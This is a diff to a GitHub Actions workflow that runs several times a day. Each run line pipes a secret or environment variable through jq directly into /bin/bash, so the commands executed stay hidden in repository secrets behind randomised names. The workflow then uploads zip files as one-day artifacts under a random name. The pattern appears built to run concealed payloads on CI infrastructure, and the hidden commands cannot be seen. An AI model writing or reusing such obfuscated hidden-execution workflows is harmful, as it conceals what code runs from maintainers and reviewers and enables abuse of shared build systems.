@@ -1,27 +1,25 @@
 name: tianyuanwangjian
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '54 1/6 * * *'
-jobs:  # 28853
+    - cron: '47 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: tianyuanwangjian
         env:
-          du5: ${{ secrets.du5 }}
+          ypva581: ${{ secrets.ypva581 }}
         run: |
-          echo $du5 | jq -r .k546 | /bin/bash
-          echo $xcl96661 | jq -r .tfqte2388 | /bin/bash
-          echo $yiqvv6875 | jq -r .zzux0966 | /bin/bash
-          echo $k519 | jq -r .czvfx59680 | /bin/bash
-          echo $t017 | jq -r .umuwt8220 | /bin/bash
-          echo $xhcij98818 | jq -r .ogsce38 | /bin/bash
-          echo $wv15261 | jq -r .ow7368 | /bin/bash
-          echo $qdyye00002 | jq -r .ngnax20 | /bin/bash
-          echo $nlvh31 | jq -r .jb8 | /bin/bash
-          echo $zyt40 | jq -r .ch69310 | /bin/bash
-          echo $nz80372 | jq -r .ki0178 | /bin/bash
-          echo $xga285 | jq -r .k86683 | /bin/bash
+          printf '%s' "$ypva581" | jq -r .bmxle86 | /bin/bash
+          echo $mo49 | jq -r .fbys86 | /bin/bash
+          printf '%s' "$j192" | jq -r .fw76 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 1zBVu5MJ
+          path: "*.zip"
+          retention-days: 1
